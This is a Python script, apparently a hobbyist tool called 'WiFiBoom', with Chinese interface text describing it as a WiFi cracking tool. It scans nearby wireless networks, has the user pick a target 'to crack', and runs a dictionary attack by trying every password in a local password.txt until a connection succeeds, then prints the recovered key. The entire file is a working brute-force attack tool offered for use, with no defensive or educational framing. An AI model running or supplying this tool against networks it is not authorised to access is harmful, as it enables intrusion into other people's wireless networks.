# --*--coding:utf-8--*--

__AUTHOR__ = "Master_LXJ"
__DOC__ = "The dream more than endlessly!"

import pywifi
import time
from datetime import datetime
import os

class WiFiBoom(object):

    def __init__(self):

        self.wifi = pywifi.PyWiFi()
        self.profile = pywifi.Profile()
        self.const = pywifi.const
        self.stime = 2

    def get_interface(self):

        ifaces = self.wifi.interfaces()
        if len(ifaces) <= 0:
            print("*"*10+"未发现网卡"+"*"*10+"\n")
            time.sleep(2)
            exit()

        elif len(ifaces) == 1:
            return ifaces[0]

        else:
            print("%-1s | %-2s"%("序号","网卡"))
            for index,name in enumerate(ifaces):
                print("%-1s | %-2s \n"%(index+1,name))
            iface_num = int(input("发现多个网卡,请选择无线网卡(输入网卡序号) :"))

            return ifaces[iface_num-1]

    def scan(self):

        print("*"*10+"正在扫描无线网络"+"*"*10+"\n")
        self.iface = self.get_interface()
        self.iface.scan()
        time.sleep(1.5)

        return self.iface.scan_results()

    def akm_int_to_str(self,akm):

        akms = [
            "AKM_TYPE_NONE",
            "AKM_TYPE_WPA",
            "AKM_TYPE_WPAPSK",
            "AKM_TYPE_WPA2",
            "AKM_TYPE_WPA2PSK",
            "AKM_TYPE_UNKNOWN"
        ]

        return akms[akm[0]]

    def auth_int_to_str(self,auth):

        auths = [
            "AUTH_ALG_OPEN",
            "AUTH_ALG_SHARED"
        ]

        return auths[auth[0]]

    def choose_ap(self):

        s = []
        global ap_num
        scans = self.scan()
        print("*"*10+"扫描到以下无线网络"+"*"*10+"\n")
        print("%-2s    %-10s    %-10s    %-6s    %-10s  \n"%("编号","名称","信号(数值越大,信号越强)","加密方式","MAC地址")+"- -"*25)
        for index,ap in enumerate(scans):
            ap.ssid = "隐藏的网络" if len(ap.ssid)==0 else ap.ssid
            if ap.ssid not in s:
                print("%-2s  |  %-25s  |  %-3s  |  %-6s  |  %-10s  "%(index+1,ap.ssid,ap.signal,self.akm_int_to_str(ap.akm),ap.bssid))
                s.append(ap.ssid)
            else:
                pass

        ap_num = int(input("- -"*25+"\n选择需要破解的WiFi编号(推荐选择信号值大于-60的) :"))
        print("- -"*10+"开始破解"+"- -"*10)
        self.start_time = datetime.now()
        print(datetime.strftime(self.start_time,"%Y-%m-%d %H:%M:%S"))

        return {
            "ssid":scans[ap_num-1].ssid,
            "auth":scans[ap_num-1].auth,
            "akm":(scans[ap_num-1].akm)[0],
        }

    def connect(self,name,password):

        self.iface.disconnect()
        self.iface.remove_network_profile(name)
        tmp_profile = self.iface.add_network_profile(self.profile)

        self.iface.connect(tmp_profile)

        self.timer(password)

    def make_profile(self,ap,password):

        assert len(password) >= 8
        # ap = self.choose_ap()
        self.profile.ssid = ap["ssid"]
        self.profile.auth = ap["auth"]
        self.profile.akm.append(ap["akm"])
        self.profile.cipher = self.const.CIPHER_TYPE_CCMP
        self.profile.key = password

        return self.profile.ssid

    def timer(self,password):

        for t in range(self.stime):
            if self.iface.status() == self.const.IFACE_CONNECTED:
                print("[+]"*10+"破解成功"+"[+]"*10+"\n"+"- -"*25)
                print("密码: {}".format(password))
                self.over_time = datetime.now()
                print(datetime.strftime(self.over_time, "%Y-%m-%d %H:%M:%S"))
                utime = self.over_time-self.start_time
                print("共用去时间: {}".format(utime))
                os.system("pause")
                os.system("exit")
                exit()
                break
            else:
                time.sleep(1)

    def run(self):

        passwords = open("password.txt","r")
        ap = self.choose_ap()
        for p in passwords.readlines():
            password = (p.split())[0]
            print("正在尝试破解：{},密码: {}".format(ap["ssid"],password))
            profile = self.make_profile(ap,password)
            self.connect(profile,password)

        passwords.close()

def strings():
    s = """
程序名称:WIFI爆破工具
版本:v0.1测试版
作者:Master_lxj
联系方式:379501669@qq.com, www.dagouzi.com
注意:字典名称必须为password.txt(每个密码单独占一行),且与该程序处于同一目录
    """
    print(s)

if __name__ == '__main__':
    strings()
    boom = WiFiBoom()
    boom.run()
